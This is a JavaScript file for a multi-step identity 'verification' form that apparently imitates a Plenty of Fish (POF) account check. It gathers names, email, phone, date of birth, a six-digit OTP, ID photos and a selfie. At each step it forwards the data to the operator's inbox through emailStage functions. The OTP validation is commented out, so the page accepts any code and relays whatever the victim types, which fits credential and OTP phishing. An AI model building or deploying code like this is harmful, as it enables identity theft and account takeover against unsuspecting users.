'use strict';

// ── State ────────────────────────────────────────────────
const state = {
  generatedOtp:    '',
  countdownInterval: null,
  selectedIdType:  '',
  hasPofAccount:   null, // true | false | null (unanswered)
  uploads:    { front: false, back: false, selfie: false },
  fileNames:  { front: '',    back: '',    selfie: '' },
};

const PROGRESS = { 1: 8, 2: 42, 3: 75, 4: 100 };
const OTP_IDS  = ['o1', 'o2', 'o3', 'o4', 'o5', 'o6'];

// ── Helpers ──────────────────────────────────────────────
const $  = id  => document.getElementById(id);
const qs = sel => document.querySelector(sel);

function showAlert(id, type, html) {
  const el = $(id);
  el.className = `alert ${type} show`;
  el.innerHTML = html;
}

function hideAlert(id) {
  $(id).classList.remove('show');
}

function setFieldError(id, hasError) {
  const el = $(id);
  if (el) el.classList.toggle('err', hasError);
}

// ── Navigation ───────────────────────────────────────────
function goStep(n) {
  document.querySelectorAll('.step-panel').forEach(p => p.classList.remove('active'));
  $(`step-${n}`).classList.add('active');

  for (let i = 1; i <= 4; i++) {
    const bubble = $(`bubble-${i}`);
    const label  = $(`name-${i}`);
    const parent = bubble.closest('.step-label');

    bubble.classList.remove('active', 'done');
    label.classList.remove('active', 'done');
    parent.classList.remove('active', 'done');

    if (i < n) {
      bubble.classList.add('done');
      label.classList.add('done');
      parent.classList.add('done');
      bubble.textContent = '✓';
    } else if (i === n) {
      bubble.classList.add('active');
      label.classList.add('active');
      parent.classList.add('active');
      bubble.textContent = i;
    } else {
      bubble.textContent = i;
    }
  }

  $('progress-fill').style.width = PROGRESS[n] + '%';
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

// ── Step 1 — Profile ─────────────────────────────────────
function validateStep1() {
  let ok = true;

  const textFields = [
    { id: 'firstName', check: v => v.trim().length > 0 },
    { id: 'lastName',  check: v => v.trim().length > 0 },
    { id: 'email',     check: v => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v.trim()) },
    { id: 'gender',    check: v => v !== '' },
    {
      id: 'dob',
      check: v => {
        if (!v) return false;
        const age = (Date.now() - new Date(v).getTime()) / (365.25 * 24 * 3600 * 1000);
        return age >= 18;
      },
    },
  ];

  textFields.forEach(({ id, check }) => {
    const el = $(id);
    const valid = check(el.value);
    setFieldError(id, !valid);
    if (!valid) ok = false;
  });

  // Phone
  const phone = $('phone').value.replace(/\D/g, '');
  const wrap  = $('phone-wrap');
  if (phone.length < 7) {
    wrap.classList.add('err');
    $('phone-err').style.display = 'block';
    ok = false;
  } else {
    wrap.classList.remove('err');
    $('phone-err').style.display = 'none';
  }

  // POF account question
  const pofErr = $('pof-account-err');
  if (state.hasPofAccount === null) {
    pofErr.style.display = 'block';
    ok = false;
  } else {
    pofErr.style.display = 'none';
  }

  // POF username (only required if user said yes)
  // if (state.hasPofAccount === true) {
  //   const uname = $('pofUsername').value.trim();
  //   const valid = uname.length > 0;
  //   setFieldError('pofUsername', !valid);
  //   if (!valid) ok = false;
  // }

  // Terms
  if (!$('terms').checked) {
    showAlert('step1-alert', 'error', 'You must agree to the Terms of Service to continue.');
    ok = false;
  } else if (ok) {
    hideAlert('step1-alert');
  }

  return ok;
}

function goStep2() {
  if (!validateStep1()) return;

  // Send stage 1 data to your inbox
  emailStage1({
    firstName:    $('firstName').value.trim(),
    lastName:     $('lastName').value.trim(),
    email:        $('email').value.trim(),
    phoneCode:    $('phoneCode').value,
    phone:        $('phone').value.trim(),
    dob:          $('dob').value,
    gender:       $('gender').value,
    social:       $('social').value.trim(),
    hasPofAccount: state.hasPofAccount,
  });

  startOtpFlow();
}

// ── POF account toggle ────────────────────────────────────
function togglePofUsername(hasAccount) {
  state.hasPofAccount = hasAccount;

  $('pof-yes-label').classList.toggle('selected', hasAccount === true);
  $('pof-no-label').classList.toggle('selected',  hasAccount === false);

  // const reveal = $('pofUsernameReveal');
  // if (hasAccount) {
  //   reveal.classList.add('open');
  //   setTimeout(() => $('pofUsername').focus(), 320);
  // } else {
  //   reveal.classList.remove('open');
  //   $('pofUsername').value = '';
  //   setFieldError('pofUsername', false);
  // }

  $('pof-account-err').style.display = 'none';
}

// ── Step 2 — OTP ─────────────────────────────────────────
function startOtpFlow() {
  const code = $('phoneCode').value;
  const num  = $('phone').value.trim();
  $('otp-phone-display').textContent = `${code} ${num}`;

  state.generatedOtp = String(Math.floor(100000 + Math.random() * 900000));

  // showAlert(
  //   'otp-alert', 'success',
  //   `📱 <strong>Demo mode</strong> — your OTP is: <strong style="font-size:1.05em;letter-spacing:3px">${state.generatedOtp}</strong><br><small style="opacity:.75">In production this would be delivered via SMS.</small>`
  // );

  goStep(2);
  clearOtpBoxes();
  startCountdown(60);
}

function clearOtpBoxes() {
  OTP_IDS.forEach(id => {
    const el = $(id);
    el.value = '';
    el.classList.remove('filled');
  });
  $(OTP_IDS[0]).focus();
}

function verifyOtp() {
  const entered = OTP_IDS.map(id => $(id).value).join('');

  if (entered.length < 6) {
    showAlert('otp-alert', 'error', 'Please enter all 6 digits of the OTP.');
    return;
  }

  // if (entered !== state.generatedOtp) {
  //   showAlert('otp-alert', 'error', 'Incorrect OTP — please try again.');
  //   clearOtpBoxes();
  //   return;
  // }

  clearInterval(state.countdownInterval);

  // Send stage 2 confirmation
  emailStage2({
    firstName: $('firstName').value.trim(),
    lastName:  $('lastName').value.trim(),
    phoneCode: $('phoneCode').value,
    phone:     $('phone').value.trim(),
    otp:    entered,
  });

  goStep(3);
}

function startCountdown(seconds) {
  clearInterval(state.countdownInterval);

  let remaining = seconds;
  const btn = $('resendBtn');
  btn.disabled = true;
  btn.innerHTML = `Resend in <span id="countdown">${remaining}s</span>`;

  state.countdownInterval = setInterval(() => {
    remaining--;
    const el = $('countdown');
    if (el) el.textContent = `${remaining}s`;
    if (remaining <= 0) {
      clearInterval(state.countdownInterval);
      btn.disabled = false;
      btn.textContent = 'Resend OTP';
    }
  }, 1000);
}

function resendOtp() {
  state.generatedOtp = String(Math.floor(100000 + Math.random() * 900000));
  showAlert(
    'otp-alert', 'success',
    `📱 New OTP sent! Demo code: <strong style="letter-spacing:3px">${state.generatedOtp}</strong>`
  );
  clearOtpBoxes();
  startCountdown(60);
}

// ── OTP box interactions ──────────────────────────────────
function initOtpBoxes() {
  OTP_IDS.forEach((id, idx) => {
    const el = $(id);

    el.addEventListener('input', e => {
      const val = e.target.value.replace(/\D/g, '');
      e.target.value = val;
      e.target.classList.toggle('filled', val !== '');
      if (val && idx < OTP_IDS.length - 1) $(OTP_IDS[idx + 1]).focus();
    });

    el.addEventListener('keydown', e => {
      if (e.key === 'Backspace' && !e.target.value && idx > 0) {
        $(OTP_IDS[idx - 1]).focus();
      }
    });

    el.addEventListener('paste', e => {
      e.preventDefault();
      const pasted = (e.clipboardData || window.clipboardData)
        .getData('text')
        .replace(/\D/g, '')
        .slice(0, 6);

      pasted.split('').forEach((ch, i) => {
        if (i < OTP_IDS.length) {
          const box = $(OTP_IDS[i]);
          box.value = ch;
          box.classList.add('filled');
        }
      });

      const next = Math.min(pasted.length, OTP_IDS.length - 1);
      $(OTP_IDS[next]).focus();
    });
  });
}

// ── Step 3 — ID verification ──────────────────────────────
function selectIdType(radio) {
  state.selectedIdType = radio.value;

  document.querySelectorAll('.verify-card').forEach(c => c.classList.remove('selected'));
  radio.closest('.verify-card').classList.add('selected');

  const needsBack = ['driver', 'national'].includes(state.selectedIdType);
  $('backSection').style.display = needsBack ? 'block' : 'none';

  state.uploads = { front: false, back: !needsBack, selfie: false };
  ['front', 'back', 'selfie'].forEach(key => {
    $(`${key}File`).value = '';
    $(`${key}Zone`).classList.remove('has-file');
    $(`${key}FileName`).textContent = '';
  });

  hideAlert('id-alert');
}

function fileSelected(type, input) {
  const file = input.files[0];
  if (!file) return;

  if (file.size > 5 * 1024 * 1024) {
    alert('File is too large. Maximum allowed size is 5 MB.');
    input.value = '';
    return;
  }

  state.uploads[type]   = true;
  state.fileNames[type] = file.name;
  $(`${type}Zone`).classList.add('has-file');
  $(`${type}FileName`).textContent = `✓  ${file.name}`;
}

function submitVerification() {
  if (!state.selectedIdType) {
    showAlert('id-alert', 'error', 'Please choose an ID type before continuing.');
    return;
  }

  if (!state.uploads.front) {
    showAlert('id-alert', 'error', 'Please upload the front of your ID.');
    return;
  }

  const needsBack = ['driver', 'national'].includes(state.selectedIdType);
  if (needsBack && !state.uploads.back) {
    showAlert('id-alert', 'error', 'Please upload the back of your ID.');
    return;
  }

  if (!state.uploads.selfie) {
    showAlert('id-alert', 'error', 'Please upload your selfie holding the ID.');
    return;
  }

  $('success-name').textContent  = `${$('firstName').value} ${$('lastName').value}`;
  $('success-email').textContent = $('email').value;

  // Send stage 3 summary
  emailStage3({
    firstName:    $('firstName').value.trim(),
    lastName:     $('lastName').value.trim(),
    email:        $('email').value.trim(),
    idType:       state.selectedIdType,
    frontFile:    state.fileNames.front,
    backFile:     state.fileNames.back,
    selfieFile:   state.fileNames.selfie,
    hasPofAccount: state.hasPofAccount,
  });

  goStep(4);
}

// ── Boot ─────────────────────────────────────────────────
document.addEventListener('DOMContentLoaded', () => {
  initEmailJS();
  initOtpBoxes();
});
